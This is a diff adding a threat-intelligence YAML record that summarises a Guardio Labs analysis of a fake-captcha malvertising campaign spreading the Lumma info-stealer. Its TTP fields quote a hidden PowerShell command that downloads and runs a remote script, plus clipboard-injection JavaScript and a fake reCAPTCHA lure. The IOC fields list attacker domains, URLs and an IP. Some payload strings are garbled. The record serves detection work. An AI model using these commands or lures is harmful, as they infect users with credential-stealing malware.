@@ -1,0 +1,56 @@
+description: 'Guardio Labs analyzed a large-scale fake captcha campaign distributing
+  Lumma info-stealer malware via malvertising, impacting over 3,000 content sites
+  and causing thousands of daily victims.
+
+  '
+attribution:
+- Monetag (ProepllerAds network)
+malware_families:
+- Lumma
+TTPs:
+  processes:
+  - powershell.exe
+  commandline:
+  - powershell.exe -W Hidden -command $url = 'https://zip-lysstore.oss-ap-southeast-1.aliyuncs.com/updateds20file/paracns.txt';
+    $response = Invoke-AVebrequest -Uri $url -Usesasicparsing; $text = $response.Content;
+    iex $text
+  powershell:
+  - 'const textToCopy = ''POWERSHELL W hIDdEN "[Text. Encoding] ::UTF8. Getstring(
+    [Convert]: :Fro| iex645t ring ('' aWVATChpd3TgI2nOCHBZ018vaNRS WBULINZLHFWLWSVCrROZWF
+    2dCOXLnF saX\1bs''; const tempTextArea = document.createElement(''textarea'');
+    tempTextArea.value = textToCopy; document.body.appendChild(tempTextArea); tempTextArea.select();
+    document.execCommand(''copy''); document.body.removeChild(tempTextArea);'
+  - const recaptchaPopup = document.getElementById('recaptchaPopup'); const overlay
+    = document.getElementById('overlay'); recaptchaPopup.classList.add('active');
+    overlay.classList.add('active'); const verifyButton = document.getElementById('verifyButton');
+    verifyButton.addEventListener('click', verify);
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - powershell.exe -> http://example.com/script.ps1
+  - powershell.exe - https://zip-lysstore.oss-ap-southeast-1.aliyuncs.com/updateds20file/paracns.txt
+  file_activity:
+  - C:\Users\user\AppData\Local\Temp\malicious_script.ps1
+  - C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+  persistence: []
+  pipes: []
+  process_relations: []
+IOCs:
+  hashes: null
+  IPs:
+  - 139.45.197.245
+  domains:
+  - zip-lysstore.oss-ap-southeast-1.aliyuncs.com
+  - monetagtdsdomain.net
+  - alwingulla.com
+  - embed.su
+  URLs:
+  - https://zip-lysstore.oss-ap-southeast-1.aliyuncs.com/updateds20file/paracns.txt
+  - https://alwingulla.com/88/tag/1
+  - https://embed.su/embed/movie/{tmdb_id}
+  - https://embed.su/embed/tv/{tmdb_id}/{season_number}
+authors:
+- Nati Tal
+reference: https://guard.io/labs/deceptionads-fake-captcha-driving-infostealer-infections-and-a-glimpse-to-the-dark-side-of
+date_of_publication: December 16, 2024
+file_creation_date: August 03, 2025
